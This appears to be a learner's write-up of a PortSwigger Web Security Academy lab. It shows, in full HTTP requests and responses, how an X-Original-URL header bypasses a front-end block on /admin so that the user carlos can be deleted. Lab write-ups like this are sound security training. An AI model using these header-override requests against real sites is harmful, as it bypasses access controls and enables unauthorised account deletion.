@@ -1,1 +1,109 @@
+Lab Description:
 
+This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. 
+However, the back-end application is built on a framework that supports the X-Original-URL header.
+To solve the lab, access the admin panel and delete the user carlos. 
+
+When i open the application, the index page shows a link to the admin interface, i start Burp and send the request for this URL:
+
+Request:
+
+GET /admin HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=HgDDzM63znbXiR12J24peWmnnD0lPpGj
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a1b000e041c04c98568a083000e0042.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+Response:
+
+HTTP/2 403 Forbidden
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 15
+
+"Access denied"
+
+As described by the initial text, to solve the lab it is necessary to use the X-Original-URL header. To do so, i just intercept a request to the home page of the application and add the header as follows:
+
+GET / HTTP/2
+Host: 0a1b000e041c04c98568a083000e0042.web-security-academy.net
+Cookie: session=HgDDzM63znbXiR12J24peWmnnD0lPpGj
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+X-Original-Url: /admin
+
+Forwarding the request, i can sucessfully load the admin page and now i can delete the user Carlos and solve the lab. Sending the request:
+
+Request:
+
+GET /admin/delete?username=carlos HTTP/2
+Host: 0a1b000e041c04c98568a083000e0042.web-security-academy.net
+Cookie: session=HgDDzM63znbXiR12J24peWmnnD0lPpGj
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a1b000e041c04c98568a083000e0042.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+Response:
+
+HTTP/2 403 Forbidden
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 15
+
+"Access denied"
+
+Ok, so the access control checks again to see if the user has the permissions, so now i just need to use the X-Original-URL again, but changes the value of the redirect URL:
+
+Request:
+
+POST / HTTP/2
+Host: 0a1b000e041c04c98568a083000e0042.web-security-academy.net
+Cookie: session=HgDDzM63znbXiR12J24peWmnnD0lPpGj
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+X-Original-Url: /admin/delete
+Content-Length: 15
+
+username=carlos
+
+And that is how i solved this lab.
